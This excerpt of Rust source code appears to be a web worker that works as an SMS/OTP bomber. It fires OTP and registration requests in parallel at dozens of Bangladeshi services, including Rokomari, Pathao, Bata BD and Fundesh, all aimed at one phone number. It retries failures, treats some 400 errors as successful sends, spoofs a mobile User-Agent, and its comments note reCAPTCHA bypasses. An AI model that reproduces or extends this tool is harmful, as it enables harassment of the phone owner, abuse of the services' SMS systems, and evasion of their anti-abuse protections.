        ...
        Ok(req) => wasm_bindgen_futures::future_to_promise(async move {
            match Fetch::Request(req).send().await {
                Ok(mut r) => {
                    ...
                    let preview = &body_text[..body_text.len().min(120)];
...
async fn fire(
    ...
    fire_core(name, url, payload, hdrs, true, 12000).await
}
...
async fn fire_core(
    ...
    for attempt in 0..3u8 {
        ...
        if matches!(status, 401 | 403 | 404 | 405 | 410 | 451) { return r; }
        ...
        // 400 — some BD APIs return 400 but still send OTP
        if status == 400 {
            let body = r["body"].as_str().unwrap_or("");
            if body.contains("otp") || body.contains("sent") || body.contains("success")
               || body.contains("SMS") || body.contains("mobile") || body.contains("OTP") {
        ...
        if matches!(status, 0 | 500 | 502 | 503 | 504) && attempt < 2 {
            let _ = JsFuture::from(sleep_promise(700)).await;
            continue;
        }
...
pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
    ...
    let api_results = parallel![
        ...
        // ══════════════════════════════════════════
        //  2. Chorki — raw: number field, plus_bd format
        // ══════════════════════════════════════════
        fire("Chorki",
        ...
        // ══════════════════════════════════════════
        //  5. Bioscope Live — raw: plus_bd_full format
        // ══════════════════════════════════════════
        fire("Bioscope Live",
        ...
        // ══════════════════════════════════════════
        //  9. Rokomari — raw: GET with query params, empty body
        // ══════════════════════════════════════════
        fire_core("Rokomari",
            &*Box::leak(format!(
                "https://www.rokomari.com/otp/send?emailOrPhone={}&countryCode=BD",
                bd_full
            ).into_boxed_str()),
            json!({}),
            &[
        ...
        // ══════════════════════════════════════════
        //  10. Sindabad — raw: websiteId as float 1.0
        // ══════════════════════════════════════════
        fire("Sindabad",
        ...
        // ══════════════════════════════════════════
        //  12. Kirei BD — raw: email field with XSRF token
        // ══════════════════════════════════════════
        fire("Kirei BD",
        ...
        // ══════════════════════════════════════════
        //  13. Walton Plaza — raw: phone=number, type=LOGIN
        // ══════════════════════════════════════════
        fire("Walton Plaza",
        ...
        // ══════════════════════════════════════════
        //  15. Easy BD Reg (alt credentials)
        // ══════════════════════════════════════════
        fire("Easy BD Reg",
            "https://core.easy.com.bd/api/v1/registration",
        ...
        // ══════════════════════════════════════════
        //  16. Le Reve Craze — raw: form-urlencoded, bypass recaptcha
        // ══════════════════════════════════════════
        fire("Le Reve Craze",
        ...
        // ══════════════════════════════════════════
        //  18. Bata BD — raw: form-urlencoded, bd_no format
        // ══════════════════════════════════════════
        fire("Bata BD",
        ...
        // ══════════════════════════════════════════
        //  26. Fundesh OTP — raw: bd_no (without leading 0)
        // ══════════════════════════════════════════
        fire("Fundesh OTP",
            ...
            &[
                ...
                ("x-requested-with","mark.via.gp"),
                ("User-Agent","Mozilla/5.0 (Linux; Android 14; TECNO CK7n Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/148.0.7778.120 Mobile Safari/537.36"),
            ]
        ),

        // ══════════════════════════════════════════
        //  27. Fundesh Resend — raw: number (with leading 0)
        // ══════════════════════════════════════════
        fire("Fundesh Resend",
        ...
        // ══════════════════════════════════════════
        //  31. Shikho SMS — raw: bd_full, auth_type=signup
        // ══════════════════════════════════════════
        fire("Shikho SMS",
        ...
        // ══════════════════════════════════════════
        //  43. RedX Login — raw: callingCode=+880, bd_no
        // ══════════════════════════════════════════
        fire("RedX Login",
        ...
        // ══════════════════════════════════════════
        //  44. Sundarban Courier — raw confirmed
        // ══════════════════════════════════════════
        ...
        // ══════════════════════════════════════════
        //  47. Garibook — raw: plus_bd format, recaptcha bypass
        // ══════════════════════════════════════════
        fire("Garibook",
        ...
        // ══════════════════════════════════════════
        //  57. Amiprobashi — raw: plus_bd, form-urlencoded
        // ══════════════════════════════════════════
        fire("Amiprobashi",
        ...
        // ══════════════════════════════════════════
        //  66. PBS Alpha OTP — raw: userPhone, origin=pbs.com.bd
        // ══════════════════════════════════════════
        fire("PBS Alpha OTP",
        ...
        // ══════════════════════════════════════════
        //  67. BD Tickets — raw: plus_bd format
        // ══════════════════════════════════════════
        fire("BD Tickets",
        ...
        // ══════════════════════════════════════════
        //  68. Shomvob — raw: bd_full, Bearer token
        // ══════════════════════════════════════════
        fire("Shomvob",
        ...
        // ══════════════════════════════════════════
        //  71. Pathao Auth — raw: bd_no, country_id=1
        // ══════════════════════════════════════════
        fire("Pathao Auth",
        ...
        // ══════════════════════════════════════════
        //  76. Beauty Booth — raw: signature, type, value, token
        // ══════════════════════════════════════════
        fire("Beauty Booth",
